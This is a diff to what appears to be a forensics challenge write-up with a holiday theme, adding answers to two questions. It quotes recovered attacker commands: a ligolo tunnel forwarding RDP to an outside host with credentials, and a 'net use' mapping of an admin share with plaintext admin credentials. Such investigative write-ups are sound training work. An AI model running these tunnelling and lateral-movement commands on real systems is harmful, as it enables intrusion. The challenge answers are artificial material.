@@ -104,3 +104,12 @@ This took a little manual analysis, eventually identifying the command:
 ```bash
 cmd.exe "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
 ```
+
+*Answer for question 2*:  
+This took a little manual analysis, eventually identifying a `net share` command at `2023-12-02T16:51:44Z`
+
+*Answer for question 3*:  
+This took a little manual analysis, eventually identifying the command:
+```bash
+cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123
+```
